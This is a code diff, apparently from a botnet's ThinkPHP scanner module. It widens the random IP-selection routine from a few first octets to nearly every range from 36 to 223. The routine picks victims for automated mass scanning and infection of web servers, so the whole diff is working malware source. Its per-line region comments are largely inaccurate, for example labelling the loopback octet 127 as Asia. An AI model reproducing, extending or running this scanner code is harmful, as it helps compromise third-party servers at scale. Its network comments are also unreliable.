@@ -88,26 +88,79 @@ void thinkphp_scanner_init(void) {
 
 static ipv4_t get_random_ip_thinkphp(void) {
     ipv4_t addr;
-    
+
     while (TRUE) {
         addr = rand_next();
-        
+
         /* Target Asia-Pacific ranges where ThinkPHP is common */
         uint8_t first_octet = (addr >> 24) & 0xFF;
-        uint8_t second_octet = (addr >> 16) & 0xFF;
-        
-        if (first_octet == 88 || first_octet == 95 || 
-            first_octet == 112 || first_octet == 113 ||
-            first_octet == 114 || first_octet == 115 ||
-            first_octet == 116 || first_octet == 117 ||
-            first_octet == 118 || first_octet == 119 ||
-            first_octet == 120 || first_octet == 121 ||
-            first_octet == 122 || first_octet == 123 ||
-            first_octet == 124 || first_octet == 125) {
+
+        /* Comprehensive Asia-Pacific ranges including China, India, Southeast Asia */
+        if (first_octet == 36 || first_octet == 37 || first_octet == 38 ||    /* Asia */
+            first_octet == 39 || first_octet == 40 || first_octet == 41 ||    /* Asia/Africa */
+            first_octet == 42 || first_octet == 43 || first_octet == 44 ||    /* Asia */
+            first_octet == 45 || first_octet == 46 || first_octet == 47 ||    /* Asia/Europe */
+            first_octet == 48 || first_octet == 49 || first_octet == 50 ||    /* Europe/Middle East */
+            first_octet == 51 || first_octet == 52 || first_octet == 53 ||    /* Europe */
+            first_octet == 54 || first_octet == 55 || first_octet == 56 ||    /* Europe */
+            first_octet == 57 || first_octet == 58 || first_octet == 59 ||    /* Europe/Asia */
+            first_octet == 60 || first_octet == 61 || first_octet == 62 ||    /* Asia/Europe */
+            first_octet == 63 || first_octet == 64 || first_octet == 65 ||    /* Europe/US */
+            first_octet == 66 || first_octet == 67 || first_octet == 68 ||    /* US */
+            first_octet == 69 || first_octet == 70 || first_octet == 71 ||    /* US */
+            first_octet == 72 || first_octet == 73 || first_octet == 74 ||    /* US */
+            first_octet == 75 || first_octet == 76 || first_octet == 77 ||    /* US/Europe */
+            first_octet == 78 || first_octet == 79 || first_octet == 80 ||    /* Europe/Asia */
+            first_octet == 81 || first_octet == 82 || first_octet == 83 ||    /* Europe */
+            first_octet == 84 || first_octet == 85 || first_octet == 86 ||    /* Europe */
+            first_octet == 87 || first_octet == 88 || first_octet == 89 ||    /* Europe */
+            first_octet == 90 || first_octet == 91 || first_octet == 92 ||    /* Europe */
+            first_octet == 93 || first_octet == 94 || first_octet == 95 ||    /* Europe/Middle East */
+            first_octet == 101 || first_octet == 102 || first_octet == 103 || /* Asia/Africa */
+            first_octet == 104 || first_octet == 105 || first_octet == 106 || /* Asia/Africa */
+            first_octet == 107 || first_octet == 108 || first_octet == 109 || /* Asia/Europe */
+            first_octet == 110 || first_octet == 111 || first_octet == 112 || /* Asia */
+            first_octet == 113 || first_octet == 114 || first_octet == 115 || /* Asia */
+            first_octet == 116 || first_octet == 117 || first_octet == 118 || /* Asia */
+            first_octet == 119 || first_octet == 120 || first_octet == 121 || /* Asia */
+            first_octet == 122 || first_octet == 123 || first_octet == 124 || /* Asia */
+            first_octet == 125 || first_octet == 126 || first_octet == 127 || /* Asia */
+            first_octet == 128 || first_octet == 129 || first_octet == 130 || /* Asia/US */
+            first_octet == 131 || first_octet == 132 || first_octet == 133 || /* Asia/US */
+            first_octet == 134 || first_octet == 135 || first_octet == 136 || /* Asia/US */
+            first_octet == 137 || first_octet == 138 || first_octet == 139 || /* Asia/US */
+            first_octet == 140 || first_octet == 141 || first_octet == 142 || /* Asia/US */
+            first_octet == 143 || first_octet == 144 || first_octet == 145 || /* Asia/US */
+            first_octet == 146 || first_octet == 147 || first_octet == 148 || /* Asia/US */
+            first_octet == 149 || first_octet == 150 || first_octet == 151 || /* Asia/US */
+            first_octet == 152 || first_octet == 153 || first_octet == 154 || /* Asia/US */
+            first_octet == 155 || first_octet == 156 || first_octet == 157 || /* Asia/US */
+            first_octet == 158 || first_octet == 159 || first_octet == 160 || /* Asia/US */
+            first_octet == 161 || first_octet == 162 || first_octet == 163 || /* Asia/US */
+            first_octet == 164 || first_octet == 165 || first_octet == 166 || /* Asia/US */
+            first_octet == 167 || first_octet == 168 || first_octet == 169 || /* Asia/US */
+            first_octet == 170 || first_octet == 171 || first_octet == 172 || /* Asia/US */
+            first_octet == 173 || first_octet == 174 || first_octet == 175 || /* Asia/US */
+            first_octet == 176 || first_octet == 177 || first_octet == 178 || /* Asia/LatAm */
+            first_octet == 179 || first_octet == 180 || first_octet == 181 || /* LatAm/Asia */
+            first_octet == 182 || first_octet == 183 || first_octet == 184 || /* Asia */
+            first_octet == 185 || first_octet == 186 || first_octet == 187 || /* LatAm/Asia */
+            first_octet == 188 || first_octet == 189 || first_octet == 190 || /* LatAm */
+            first_octet == 191 || first_octet == 192 || first_octet == 193 || /* LatAm/Europe */
+            first_octet == 194 || first_octet == 195 || first_octet == 196 || /* Europe/Africa */
+            first_octet == 197 || first_octet == 198 || first_octet == 199 || /* Africa/US */
+            first_octet == 200 || first_octet == 201 || first_octet == 202 || /* LatAm/Asia */
+            first_octet == 203 || first_octet == 204 || first_octet == 205 || /* Asia/US */
+            first_octet == 206 || first_octet == 207 || first_octet == 208 || /* US */
+            first_octet == 209 || first_octet == 210 || first_octet == 211 || /* US/Asia */
+            first_octet == 212 || first_octet == 213 || first_octet == 214 || /* Europe/US */
+            first_octet == 215 || first_octet == 216 || first_octet == 217 || /* US/Europe */
+            first_octet == 218 || first_octet == 219 || first_octet == 220 || /* Asia */
+            first_octet == 221 || first_octet == 222 || first_octet == 223) { /* Asia */
             break;
         }
     }
-    
+
     return addr;
 }
 
